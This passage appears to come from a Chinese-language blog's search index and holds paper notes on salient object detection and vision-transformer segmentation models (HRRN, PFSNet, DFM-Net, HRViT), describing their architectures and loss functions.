src="/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/低分辨率SOD模型.PNG"></div>从上图可以发现，显著像素点可以分为以下三类：<blockquote><ul><li>(1)大多数显著对象内部的像素具有最高的显著值，我们称为确定的显著像素</li><li>(2) 背景区域中的大多数像素具有最低的显著值，我们称为确定的背景显著像素</li><li>(3) 模糊物体边界像素的显著值在0到1之间波动，称之为不明确像素</li></ul></blockquote><p>理想的 SOD 方法应有效识别图像中明确的显着区域和背景区域，并准确计算不确定区域中像素的显着性值，以保持清晰的目标边界。也就是一个回归任务加一个分类任务。<br>将高分辨率显着对象检测分离为低分辨率显着性分类网络(LRSCN)和高分辨率细化网络(HRRN).LRSCN旨在以低分辨率捕获足够的语义并将像素分类为三个不同的集合以供以后处理.HRRN旨在准确提炼不确定区域中像素的显着性值,以在GPU内存有限的情况下以高分辨率保持清晰的对象边界.如上所述,HRRN 需要高分辨率图像中的结构细节。然而，广泛使用的低分辨率显着性数据集通常在注释质量方面存在一些问题,几乎不可能从这些有缺陷的数据集中直接获得足够的对象边界细节来训练高分辨率网络。在最近的工作中，Zeng 等人。提出通过使用具有准确注释的高分辨率图像来训练他们的 SOD 网络。然而，如此高质量的图像标注需要大量的人工成本。在我们的论文中,我们认为没有必要在网络训练中使用这种精确注释的高分辨率图像.通过在训练过程中引入不确定性，我们的 HRRN 可以仅使用标注不佳的低分辨率训练数据集很好地解决高分辨率细化任务。</p><h3 id="模型方法"><a href="#模型方法" class="headerlink" title="模型方法"></a>模型方法</h3><h3 id="HRRN-High-Resolution-Network-Framework"><a href="#HRRN-High-Resolution-Network-Framework" class="headerlink" title="HRRN High Resolution Network Framework"></a><center>HRRN High Resolution Network Framework</center></h3><div align="center"><img src="/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/HRRN高分辨率网络框架.PNG"></div>LRSCN的目的是在低分辨率下获取足够的语义并将像素分为三个不同的集合，同时节省内存的使用，HRRN计算回归像素的显著性值，并在高分辨率下保持清晰的对象边界<p>LRSCN使用一个简单的U-Net编码器解码器架构，VGG-16作为主干网络，因此将从Conv1-2，Conv2-2，Conv3-3，Conv4-3，Conv5-3，Conv6-3获得六个特征，但是由于前两个特征的感受野太小，则不使用。在编码器和解码器之间增加一个多尺度特征提取和跨级特征融合模块(MECF)，以提高特征表示的可辨别性。解码器自上而下的方式融合MECF的输出特征和上一阶段的上采样特征，每个解码器的输出定义为$D_{i},i&#x3D;1,2,3…n$,最后SGA模块建立在D3之上用来生成准确的显著预测图T，为了回归清晰的目标边界值，HRRN的输入是在LRSCN提供的trimap引导下的高分辨率图像。HRRN具有基本的编码器-解码器架构，在不确定性损失的帮助下，网络可以对噪声数据更加鲁棒，并预测具有清晰边界的高分辨率显着图。</p><h4 id="LRSCN"><a href="#LRSCN" class="headerlink" title="LRSCN"></a>LRSCN</h4><p>###<center>LRSCN架构图</center></p><div align="center"><img src="/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/LRSCN架构图.PNG"></div>开发了一种基于全局卷积网络GCN的多尺度特征提取模块ME，以扩大特征感受野并获得多尺度信息。为了实现第二个目标，我们利用跨级别特征融合模块CF来利用不同级别的特征优势。此外，在设计网络架构时，受的启发，我们使用拆分变换策略进一步放大 特征感受野，从而产生更具辨别力的特征表示。具体来说，我们将输入F按通道维度均匀地分成两部分${ F_{1}, F_2}$，然后将$F_1$送入多尺度特征提取路径，将$F_2$送入跨级特征融合路径。这两个路径的输出连接在一起作为最终输出。我们称这个桥接模块为MECF模块，如上图所示。<h3 id="SGA模块："><a href="#SGA模块：" class="headerlink" title="SGA模块："></a>SGA模块：</h3><p>每个解码器融合来自MECF模块和前一解码器级的特征，然后使用$3×3$卷积层进行最终预测。为了保持trimap和显著图的一致性，确保trimap的不确定区域能够准确覆盖显著图的边界，我们在D3上设计了一个显著引导注意模块（SGA）。具体来说，我们首先使用$3×3$卷积和sigmoid函数来计算显著性映射。然后，将显著性图视为空间权重图，有助于细化特征并生成精确的trimap。最后，输出trimap T是3通道分类logits。整个SGA模块保证trimap和saliecny地图的对齐。 </p><h3 id="HRRN模块"><a href="#HRRN模块" class="headerlink" title="HRRN模块"></a>HRRN模块</h3><p>HRRN遵循解纠缠原则，在LRSCN提供的trimap的指导下，精确细化不确定区域中像素的显著性值，以保持高分辨率下清晰的目标边界。HRRN的架构如图2所示。HRRN有一个简单的类似U-NET的体系结构。为了在高分辨率下进行更好的预测，我们进行了一些非平凡的修改。首先，底层特征包含丰富的空间和细节信息，这些信息在恢复清晰的对象边界方面起着至关重要的作用，因此解码器在每个上采样块之前而不是在每个上采样块之后组合编码器特征。此外，我们使用一个两层的快捷块来对齐编码器特征通道，以进行特征融合。其次，为了让网络更加关注细节信息，我们通过一个快捷块将原始输入直接反馈到最后一个卷积层，以产生更好的结果。最后，从图像生成任务中学习，我们对每个卷积层使用谱归一化，以对网络的$Lipschitz$常数添加约束并稳定训练。 </p><p>为了监督LRSCN，我们应该生成trimap的GT表示为$T^{gt}$，它可以表示确定的显着、确定的背景和不确定的区域。如上所述，不确定区域主要存在于对象的边界处。因此，我们使用随机像素数（5、7、9、11、13）在对象边界处擦除和扩展二进制真实图，以生成GT不确定区域。 剩余的前景和背景区域代表明确的显着和背景区域。$T^{gt}$ 定义为：<br>$$<br>\Large T_{gt}(x,y) &#x3D;\begin{cases}<br>2 &amp; T_{gt}(x,y)\in definite salient \<br>0 &amp; T_{gt}(x,y)\in definite background \<br>1 &amp; T_{gt}(x,y)\in uncertain region \<br>\end{cases}<br>$$<br>其中$(x,y)$表示图像上的每个像素位置。如下图所示</p><h3 id="结果可视化"><a href="#结果可视化" class="headerlink" title="结果可视化"></a><center>结果可视化</center></h3><div align="center"><img src="/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/HRRN结果可视化.PNG"></div><p>对于trimap的监督我们使用交叉熵损失<br>$$\Large L_{trimap}&#x3D;\dfrac{1}{N}\sum_{i}-log(\dfrac{e^{T_{i} } }{\sum_{j} e^{T_{j} } })$$<br>为保障trimap的准确率，我们在trimap监督的基础上增加了额外显著性监督$L_{saliency}$，总损失是<br>$$\Large L_{LRSCN}&#x3D;L_{saliency}+L_{trimap}$$<br>不使用不确定性损失，因为LRSCN的主要目标是获取足够的语义，而不是精确的边界。</p><p>对于输入的高分辨率图像$I$，让$G^H$表示其背景真值，预测显著性图为$S^H$。我们利用$L_1$损失来比较预测显著性图和背景真值在明确的显著性和背景区域上的绝对差异：<br>$$\Large L_1 &#x3D; \dfrac{1}{E}\sum_{i\in E}|S_{i}^H-G_{i}^H|$$<br>其中$E$表示在$trimap$中被标记为明确显着或背景的像素数，$S_{H}^i$和$G_{H}^i$表示位置$i$处的预测值和$groundtruth$值。<br>由于数据集本身在注释质量方面存在一些问题，因此引入一个不确定损失来解决数据集本身带来的缺陷。使用高斯似然的方式建模不确定性<br>$$\Large p(y|f(x))&#x3D;N(f(x),\delta^2)$$<br>其中$\delta$表示测量的不确定性，$y$是输出，在最大似然推断中，我们将模型的对数似然最大化，表示为:<br>$$\Large logp(y|f(x))\propto-\dfrac{||y-f(x)||}{2\delta^2}-\dfrac{1}{2}log{\delta^2}$$<br>则不确定损失定义为：<br>$$\Large L_{uncertainty}&#x3D;\dfrac{||y-f(x)||^2}{2\delta^2}+\dfrac{1}{2}log\delta^2$$<br>将其转化为像素的表达形式：<br>$$\Large L_{uncertainty}&#x3D;\dfrac{1}{U}\dfrac{||S_{i}^H-G_{i}^H||}{2\delta_{i}^2}+\dfrac{1}{2}log\delta_{i}^2$$</p><h3 id="HRRN损失可视化"><a href="#HRRN损失可视化" class="headerlink" title="HRRN损失可视化"></a><center>HRRN损失可视化</center></h3><div align="center"><img src="/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/HRRN损失可视化.PNG"></div>]]></content>
      
      
      <categories>
          
          <category> SOD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyramidal Feature Shrinking for Salient Object Detection</title>
      <link href="/2023/04/11/PFSNet/"/>
      <url>/2023/04/11/PFSNet/</url>
      
        <content type="html"><![CDATA[<h1 id="Pyramidal-Feature-Shrinking-for-Salient-Object-Detection"><a href="#Pyramidal-Feature-Shrinking-for-Salient-Object-Detection" class="headerlink" title="Pyramidal Feature Shrinking for Salient Object Detection"></a><center>Pyramidal Feature Shrinking for Salient Object Detection</center></h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>提出了一种金字塔型特征收缩网络(PFSNet) ，其目的是将相邻的特征节点按照层层收缩的方式进行聚合，从而使聚合后的特征融合有效的细节和语义，丢弃干扰信息。特别地，提出了一种金字塔收缩译码器(PSD) ，以渐近的方式分层聚合相邻特征。此外，我们提出了一个相邻融合模块(AFM)来进行相邻特征之间的空间增强，以动态加权特征和自适应融合适当的信息。此外，利用基于主干提取特征的尺度感知富集模块(SEM)获取丰富的尺度信息，生成具有扩张卷积的不同初始特征。</p><p>在SOD任务中，高低级特征在功能之间有着很大的差距，SOD算法的关键在于如何充分利用语义和细节信息，在最后两个特征的合并中，具有丰富细节和噪声的低级特征和高级特征相融合，但是当两种特征完全不同时，差异较大的特征直接融合会产生噪声，导致性能的下降.<br><img src="/2023/04/11/PFSNet/PSD.PNG"><br>本文提出了一种金字塔收缩解码器，将相邻特征定义为相似特征，将不相邻的特征定义为孤立特征，PSD仅收缩每层中类似的特征，经过几层收缩后，最时候当前输入的特征得以保留，然后配合AFM融合模块实现增强当前样本的特征并抑制不适合的特征，最后为了充分利用好多尺度信息，配合使用SEM。其对应的架构图如下所示：<br><img src="/2023/04/11/PFSNet/PFSNet架构.PNG"></p><h3 id="AFM模块"><a href="#AFM模块" class="headerlink" title="AFM模块"></a>AFM模块</h3><p>将待合并的特征视为父特征，合并后的特征视为子特征，AFM要实现的两个功能：</p><blockquote><p>（1）子特征应该继承适当当前输入样本的特征，并丢弃不适合的特征</p><p>（2）子特征要和父特征保持相同的尺寸</p></blockquote><p>首先通过逐元素乘法从父特征中提取共享特征，然后通过逐元素加法将共享特征加到父特征中从而增强它们，通过级联运算将两个处理后的特征合并，然后让它们依次通过全局平均化，$1\times1$卷积和softmax函数来生成权重向量，最后对权重向量和特征进行相应的乘法，得到加权后的特征，在特征加权后再使用$3\times3$卷积来压缩与副特征一致的子特征的通道，由于不同的特征具有不同的权重，因此在卷积计算受，具有较小权重的元素很少被子特征继承，通过这种方式，达到子特征继承重要的特征并丢弃更多的噪声的目的。</p><h3 id="PSD模块"><a href="#PSD模块" class="headerlink" title="PSD模块"></a>PSD模块</h3><p>本文首次提出将相邻特征扩展到层次融合。这样，我们就可以利用相邻特征融合的优势，实现多层次的特征融合，避免跳跃式融合操作。此外，从最后一个特征融合的位置来看，它可以直接集成基于 FPN 的框架中包含噪声的低层特征，而 PFSNet 则消除了大量的噪声。<br>PSD的核心目的是为了实现多特征集成，同时尽可能避免跳跃式特征融合的操作，PSD是由AFM组成的结构。合并特征的过程在相邻节点对中进行，首先使用backone提出五层特征$f_1,f_2,f_3,f_4,f_5$,然后使用AFM模块将相邻的特征$f_i,f_{i+1}$得到$f^{‘}_i$依次类推得到最后的特征$f$</p>]]></content>
      
      
      <categories>
          
          <category> SOD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Salient Object Detection via Dynamic Scale Routing</title>
      <link href="/2023/04/11/Salient%20Object%20Detection%20via%20Dynamic%20Scale%20Routing/"/>
      <url>/2023/04/11/Salient%20Object%20Detection%20via%20Dynamic%20Scale%20Routing/</url>
      
        <content type="html"><![CDATA[<h2 id="Salient-Object-Detection-via-Dynamic-Scale-Routing"><a href="#Salient-Object-Detection-via-Dynamic-Scale-Routing" class="headerlink" title="Salient Object Detection via Dynamic Scale Routing "></a><center>Salient Object Detection via Dynamic Scale Routing </center></h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>现有的SOD模型的编码器可以通过提取多尺度特征，并通过各种微妙的解码器组合特征，但是这个特征通常是固定的，实际上，在不同场景中配合使用不同的内核大小是更可取的，因此本文提出了一种动态的金字塔卷积模型，动态选择最适合的内核大小，其次提出了一种自适应双向解码器以最好适应基于DPConv的编码器。最重要的的亮点是它能够在特征尺度及其动态集合之间进行路由，使推理过程具有尺度感知能力</p>]]></content>
      
      
      <categories>
          
          <category> SOD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>像素级光场显著性检测</title>
      <link href="/2023/04/11/%E5%83%8F%E7%B4%A0%E7%BA%A7%E5%85%89%E5%9C%BA%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B/"/>
      <url>/2023/04/11/%E5%83%8F%E7%B4%A0%E7%BA%A7%E5%85%89%E5%9C%BA%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>在一个统一的框架中识别干净的标签且有效的整合光场线索之间的关系。将学习描述为光场内特征融合流和场景间相关流的联合优化，以生成预测，首先引入一个像素遗忘引导融合模块，以相互增强光场特征，并利用迭代过程中的像素一致性来识别噪声像素，再引入跨场景噪声惩罚损失，以更好地反映训练数据的潜在结构，并使学习对噪声保持不变。</p><blockquote><p>光场图像：</p><ul><li>光场：是一个四维的参数化表示，是空间中同时包含位置和方向信息的四维光辐射场，简单地说，涵盖了光线在传播中的所有信息，在空间内任意角度，任意的位置都可以获得整个空间环境的真实信息，用光场获得的图像信息更加全面，品质更好。<br><img src="/./image/%E5%85%89%E5%9C%BA.PNG"></li><li>光场成像的原理：传统相机成像是光线穿过镜头，而后传播到成像平面，光场成像则是在传感器平面添加了一个微透镜矩阵，在于将穿过主镜头的光线再次穿过每个微透镜，从而收获到光场的方向与位置信息，使成像结果在后期更加可调节，达到先拍照后聚焦的效果。<br><img src="/./image/%E5%85%89%E5%9C%BA%E6%88%90%E5%83%8F.PNG"></li></ul></blockquote><p>直接在像素级别噪声标签上训练显著性检测网络可能会引导网络过度适应损坏的标签。且当前现有的方式都缺乏全局视角来探索整个数据集之间的关系模式  </p><blockquote><h3 id="光场显著性："><a href="#光场显著性：" class="headerlink" title="光场显著性："></a>光场显著性：</h3></blockquote>]]></content>
      
      
      <categories>
          
          <category> SOD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于深度质量的特征操作实现高效的RGBD显著目标检测</title>
      <link href="/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/"/>
      <url>/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><center>摘要</center></h2><p>基于RGBD显著目标检测模型在减少模型参数时，模型精度通常会下降，且受到深度质量的影响。本文设计了一种基于深度质量的特征操作(DQFM)：利用低级RGB和深度特征的对齐，以及深度流的整体关注来明确控制和增强跨模态融合。这是一个轻量化模型。  </p><p>高质量的深度图通常具有一些与相应RGB图像对齐的边界</p><h3 id="Efficient-RGBD-SOD-Method"><a href="#Efficient-RGBD-SOD-Method" class="headerlink" title="Efficient RGBD SOD Method"></a>Efficient RGBD SOD Method</h3><p>将知识蒸馏就是用于深度蒸馏器，将从深度流获取到的深度知识转移到RGB流，从而实现无深度推理框架，后Chen设计了一个定制的深度主干，以提取互补特征</p><h3 id="网络结构图"><a href="#网络结构图" class="headerlink" title="网络结构图"></a><center>网络结构图</center></h3><div align="center"><img src="/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/DFM-Net.PNG"></div><p>由编码器和解码器构成，其中RGB分支同时负责RGB特征提取和RGB与深度特征之间的交叉模式融合，另一方面解码器部分负责进行简单的两阶段融合以生成最终的显著性图，具体的说就是：编码器包括一个基于MobileNet-v2的RGB相关分支，一个深度相关分支，以及DQFM。在某个层次提取的深度特征通过DQFM后，再经过简单的元素加法融合到RGB分支中，然后发送到下一个层次。为了捕获多尺度语义信息，在RGB分支的末尾添加了PPM(金字塔池模块),在实际操作中，DQFM包含两个连续操作，深度质量启发加权和深度整体注意。  </p><h3 id="DQW结构"><a href="#DQW结构" class="headerlink" title="DQW结构"></a><center>DQW结构</center></h3><div align="center"><img src="/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/DQW%E7%BB%93%E6%9E%84.PNG"></div><p>首先将低层特征$f_{r}^{1}$ 和 $f_{d}^{1}$ 转化为特征$ f_{rt^{‘} }$和$ f_{dt^{‘} }$,<br>$$ \large f_{rt^{‘} }&#x3D;BConv_{1\times1}(f_{r}^{1}),f_{dt^{‘} }&#x3D;BConv_{1\times1}(f_{d}^{1})$$</p><p>其中$BConv$表示$1\times1$卷积和$ReLU$激活函数，为了评估低级特征对齐，对这两个特征进行对齐编码<br>$$ \large V_{BA}&#x3D;\dfrac{GAP(f_{rt^{‘} }\otimes f_{dt^{‘} })}{GAP(f_{rt^{‘} } + f_{dt^{‘} })}$$</p><p>其中$GAP(\cdot)$表示全局平均池化操作，$\otimes$表示按元素乘法。增强向量的计算方式：<br>$$ \large V_{BA}^{ms}&#x3D;[V_{BA},V_{BA}^{1},V_{BA}^{2}]$$<br>其中[$\cdot$]表示通道串联。然后使用两个完全连接的层使得$\alpha\in\mathbb{R}^{5}$转化到$V_{BA}^{ms}$计算方式为：<br>$$\large\alpha&#x3D;MLP(V_{BA}^{ms})$$<br>$MLP(\cdot)$表示末端为$Sigmoid$函数的感知器。</p><h3 id="DHA结构"><a href="#DHA结构" class="headerlink" title="DHA结构"></a><center>DHA结构</center></h3><div align="center"><img src="/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/DHA%E7%BB%93%E6%9E%84.PNG"></div><p>首先利用最高级特征$f_{d}^{5}$从深度流定位粗糙的突出区域，使用压缩和上采样方式使得$f_{d}^{5}$转化为$f_{dht}$计算方式为<br>$$\large f_{dht}&#x3D;F_{UP}^{8}(BConv_{1\times1}(F_{DN}^2(f_{d}^5))$$</p><p>其中$F_{UP}^{8}$表示8层双线性上采样，然后结合低层RGB和深度特征进行重新校准。为了更好地模拟低水平和高水平特征之间的长期依赖性，同时保持DHA的效率，我们采用最大池运算和扩大卷积来快速增加感受野。重新校准过程定义为：<br>$$ \large F_{rec}(f_{dht})&#x3D;F_{UP}^{2}(DConv_{3\times3}(F_{DN}^{2}(f_{dht}+f_{ec})))$$</p><p>$F_{rec}(\cdot)$表示重新校准过程。$DConv_{3\times3}(\cdot)$表示$3\times3$扩张卷积，步长为1，扩张率为2.然后是$BatchNorm$和$ReLU$激活函数，$F_{UP}^{2}(\cdot)&#x2F;F_{DN}^{2}(\cdot)$表示双线性上采样\下采样操作。为提高性能，再进行两次重新校准。<br>$$\large f_{dht}^{‘}&#x3D;F_{rec}(f_{dht}),f^{‘’}<em>{dht}&#x3D;F</em>{rec}(f^{‘}_{dht})$$</p><p>最终实现整体注意力地图：<br>$$\large \beta&#x3D;BConv_{3 \times 3}(f_{ec}+f_{dht}^{‘’})$$</p><p>最后获得五张深度整体注意图$\large{ {\beta_{1},\beta_{2},\beta_{3},\beta_{4},\beta_{5} }}$如下图所示：  </p><div align="center"><img src="/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/DHA%E5%8F%AF%E8%A7%86%E5%8C%96.PNG"></div><p>通常情况下，深度学习不如RGB图像，为实现效率和准确性的平衡，本文选择定制深度主干(TDB)，具体来说就是基于$MobliceNetV2$中的反向剩余瓶颈块(IRB)并构建一个新的更小的主干，减少信道数量和堆叠块。结构如下：</p><div align="center"><img src="/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/%E5%AE%9A%E5%88%B6TDB%E6%A8%A1%E5%9D%97.PNG"></div><h2 id="解码器"><a href="#解码器" class="headerlink" title="解码器"></a>解码器</h2><p>简化版的两级解码器，包括预融合和完全融合，预融合是通过信道压缩和层次分组来减少特征信道和层次，完全融合则是进一步聚合低层和高层特征，生成最终的显著图。</p><h3 id="预融合阶段"><a href="#预融合阶段" class="headerlink" title="预融合阶段"></a>预融合阶段</h3><p>首先使用具有$BatchNorm$和$ReLU$激活的$3\times3$深度可分离卷积，表示为$DSConv_{3\times3}$,将压缩编码器特征$f_{c}^{i},(i&#x3D;1,2,…6)$到统一信道16，然后使用通道注意算子$F_{CA}$通过加权不同信道来增强特征。这个过程可以表示为：<br>$$\large cf_{c}^{i}&#x3D;F_{CA}(DSConv_{3\times3}(f_{c}^{i}))$$<br>其中$cf_{c}^{i}$表示压缩和增强功能。为了减少特征层次，作者将6个层次分为两个层次(低级层次和高级层次)<br>$$ \large cf_{c}^{low}&#x3D;\sum_{i&#x3D;0}^{3}F_{UP}^{2^{i-1} }(cf_{c}^{i}),cf_{c}^{high}&#x3D;\sum_{i&#x3D;4}^{6}cf_{c}^{i}$$</p><h3 id="聚合模块"><a href="#聚合模块" class="headerlink" title="聚合模块"></a>聚合模块</h3><p>由于在预融合阶段，信道数量和层次已经减少，在全融合阶段，我们直接将高层和低层层次串联起来，然后将串联馈送到预测头，以获得最终的全分辨率预测图，表示为：$$ \large S_c&#x3D;F_{p}^{c}([cf_{e}^{low},F_{UP}^{8}(cf_{c}^{high})])$$其中$S_c$表示最终的显著性图，$F_{p}^{c}(\cdot)$表示一个预测头，由两个$3\times3$深度方向可分离卷积（然后是$BatchNorm$层和$ReLU$激活）、一个$3\times3Sigmoid$激活卷积以及一个$2\times$双线性上采样组成，以恢复原始输入大小。</p><h2 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h2><p>总损失$\pounds$最终由深度分支损失$\pounds_{c}$和深度监管损失$\pounds_{d}$构成，<br>$$\large \pounds &#x3D; \pounds_{c}(S_{c},G)+ \pounds_{d}(S_{d},G)$$<br>我们使用的是标准的交叉熵损失</p>]]></content>
      
      
      <categories>
          
          <category> SOD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Multi-Scale High-Resolution Vision Transformer for Semantic Segmentation</title>
      <link href="/2023/04/11/%E5%A4%9A%E5%B0%BA%E5%BA%A6%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87Transformer/"/>
      <url>/2023/04/11/%E5%A4%9A%E5%B0%BA%E5%BA%A6%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87Transformer/</url>
      
        <content type="html"><![CDATA[<h1 id="Multi-Scale-High-Resolution-Vision-Transformer-for-Semantic-Segmentation"><a href="#Multi-Scale-High-Resolution-Vision-Transformer-for-Semantic-Segmentation" class="headerlink" title="Multi-Scale High-Resolution Vision Transformer for Semantic Segmentation"></a><center>Multi-Scale High-Resolution Vision Transformer for Semantic Segmentation</center></h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>VITs主要是为生成低分辨率表示的图像分类任务而设计的，这使得VITs的语义分割等密集预测任务具有挑战性，本文提出的HRVIT，通过高分辨率多分枝架构与ViT集成来增强ViT以学习语义丰富和空间精确的多尺度表示，通过各种分支块协同优化技术平衡HRVIT的模型行恩那个和效率</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>VIT的单尺度和低分辨率表示对于需要高敏感性和细粒度图像细节的语义分割不友好。已有的多尺度VIT网络大多遵循类似于分类的网络拓扑，具有顺序或串联架构，基于复杂性考虑，都是逐渐对特征图进行下采样，以提取更高级别的低分辨表示，并将每个阶段的输出直接馈送到下游分割头，这样的顺序结构缺乏足够的跨尺度交互，因此没法产生高质量的高分辨率表示</p><p>HRVIT并行提取多分辨率特征并反复融合它们以生成具有丰富语义信息的高质量HR表示。简单的将HRNET中所有的卷积残差块替换为Transformer将遇到严重的可扩展性问题，如果没有良好的架构块协同优化，从多尺度继承的高表示能力可能会被硬件上令人望而却步的延迟和能源成本所击倒。因此本文使用以下方式进行优化</p><ul><li>1）HRViT的多分支HR架构在跨分辨率融合的同时提取多尺度特征</li><li>2）使用增强局部注意力消除率冗余键和值以提高效率，并通过额外的并行卷积路径，额外的非线性单元和用于特征多样性增强的辅助快捷方式来增强模型的表达能力。</li><li>3）HRViT采用混合尺度卷积前馈网络加强多尺度特征提取</li><li>4）HRVIT的HR卷积结构和高效的补丁嵌入层在降低硬件成本的情况下保持率更多的低级细粒度特征</li></ul><h3 id="HRViT网络结构图"><a href="#HRViT网络结构图" class="headerlink" title="HRViT网络结构图"></a><center>HRViT网络结构图</center></h3><div align="center"><img src="/2023/04/11/%E5%A4%9A%E5%B0%BA%E5%BA%A6%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87Transformer/HRViT.PNG"></div>由图可知，HRViT第一部分由卷积干组成，同时提取低层特征，在卷积stem后，HRViT部署了四个渐进式Transformer阶段，其中第n阶段包含n个并行的多尺度Transformer分支，每个阶段可以有一个或多个模块。每个模块从一个轻量级密集融合层开始，以实现跨分辨率交互和一个用于局部特征提取的有效补丁嵌入块，然后是重复的增强局部自注意力块和混合尺度卷积前馈网络，与逐步降低空间维度以生成金字塔特征的顺序ViT主干不同，我们在整个网络中维护HR特征，以通过跨分辨率融合增强HR表示的质量。<p>多分支HRNet和self-attention运算所带来的高度复杂性会迅速导致内存占用，参数大小急剧上升，计算成本爆炸性增长，简单地在每个模块上分配相同局部注意力窗口大小的块将导致巨大的计算成本，根据对于复杂性分析，</p><div align="center"><img src="/2023/04/11/%E5%A4%9A%E5%B0%BA%E5%BA%A6%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87Transformer/复杂度分析.PNG"></div>最后决定使用狭窄的关注窗口代销，并在两条HR路径上使用最小数量的块。在中等分辨率的第三个分支，使用具有大窗口的深度分支，以提供大的感野和提取良好的高级特征。低分辨率的分支包含大多数参数们对于提供具有全局感受野的高级特征以及生成粗分割图非常有用，但是较低的空间尺度会导致图像细节丢失过多，因此旨在低分辨率的分支上部署几个大窗口块，已在参数预算下提高高级特征质量。十字形self-attention算子<div align="center"><img src="/2023/04/11/%E5%A4%9A%E5%B0%BA%E5%BA%A6%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87Transformer/HRVITAttn.PNG"></div><h4 id="cross-shaped-self-attention"><a href="#cross-shaped-self-attention" class="headerlink" title="cross-shaped self-attention"></a>cross-shaped self-attention</h4><ul><li>细粒度注意力</li><li>近似全局视图：通过两个平行正交的局部注意力，能够收集全局信息</li><li>可伸缩复杂性：窗口是一个维度固定的，避免了图像大小的二次复杂性</li></ul><p>遵循CSWin中的十字形窗口划分方法，将输入$x\in R^{H\times W\times C}$分成两部分${x_H,x_V \in R^{H\times W\times C&#x2F;2}}$,$x_H$被分割成不相交的水平窗口，而另外一半$x_V$被分割成垂直窗口。将窗口设置为$s\times W$或者$H\times 